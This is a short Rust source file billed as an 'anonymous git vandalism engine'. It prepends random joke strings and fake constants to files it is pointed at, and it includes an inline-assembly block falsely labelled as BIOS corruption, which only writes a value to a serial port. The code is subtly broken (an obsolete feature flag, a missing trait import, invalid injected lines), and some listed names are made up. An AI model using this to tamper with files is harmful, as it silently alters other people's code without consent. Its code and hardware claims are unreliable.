// MEMETIC BANKSY SIGIL
// Anonymous git vandalism engine

#![feature(asm)]

use std::fs;
use std::path::Path;
use rand::Rng;

const SACRED_TEXTS: [&str; 5] = [
    "権利上一笑",
    "燦々と光る internet death",
    "人人生而自由",
    "電脳シギル",
    "シギル ACTIVATION"
];

const MUSK_BABIES: [&str; 4] = [
    "X Æ A-XII",
    "Exa Dark Sideræl (Y)",
    "Griffith Musk",
    "Casca Musk"
];

pub fn vandalize_file(path: &Path) -> std::io::Result<()> {
    let content = fs::read_to_string(path)?;
    
    if !content.contains("BANKSY_CORE") {
        let mut rng = rand::thread_rng();
        let injection = match rng.gen_range(0..=5) {
            0 => format!("// {} {}", 
                SACRED_TEXTS[rng.gen_range(0..SACRED_TEXTS.len())],
                chrono::Local::now().format("%Y-%m-%d %H:%M:%S")),
            1 => format!("const {} = '{}';", 
                MUSK_BABIES[rng.gen_range(0..MUSK_BABIES.len())].replace(" ", "_"),
                SACRED_TEXTS[rng.gen_range(0..SACRED_TEXTS.len())]),
            2 => "#[allow(banksy_vandalism)]".to_string(),
            3 => "/* GHOST ARTIST WAS HERE (RUST IN PEACE) */".to_string(),
            _ => "".to_string()
        };

        if !injection.is_empty() {
            fs::write(path, format!("{}\n{}", injection, content))?;
            
            // 3AM BIOS corruption
            if chrono::Local::now().hour() == 3 {
                unsafe { 
                    asm!(
                        "mov eax, 0xDEADBEEF",
                        "out 0x3F8, eax",
                        options(nostack)
                    );
                }
            }
        }
    }
    Ok(())
}

#[test]
fn test_vandalism() {
    let test_file = Path::new("/tmp/banksy_test.rs");
    fs::write(test_file, "// Original file").unwrap();
    vandalize_file(test_file).unwrap();
    assert!(fs::read_to_string(test_file).unwrap().contains('\n'));
    fs::remove_file(test_file).unwrap();
}